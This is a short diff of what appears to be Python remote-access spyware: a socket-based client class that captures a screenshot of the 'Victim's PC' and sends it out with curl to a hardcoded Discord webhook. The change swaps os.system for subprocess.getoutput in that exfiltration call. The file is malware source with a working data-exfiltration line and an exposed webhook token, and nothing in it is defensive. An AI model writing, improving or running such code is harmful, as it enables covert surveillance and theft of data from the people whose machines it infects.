@@ -7,6 +7,7 @@ from PIL import ImageGrab
 import requests
 import cv2
 import numpy as np
+import subprocess
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -65,7 +66,7 @@ class Client():
     def send_screenshot_to_discord(self):
         ImageGrab.grab().save("screenshot.png")
         _temp_path=os.path.join(os.getcwd(),"screenshot.png")
-        os.system(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
+        subprocess.getoutput(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         c=socket.socket()
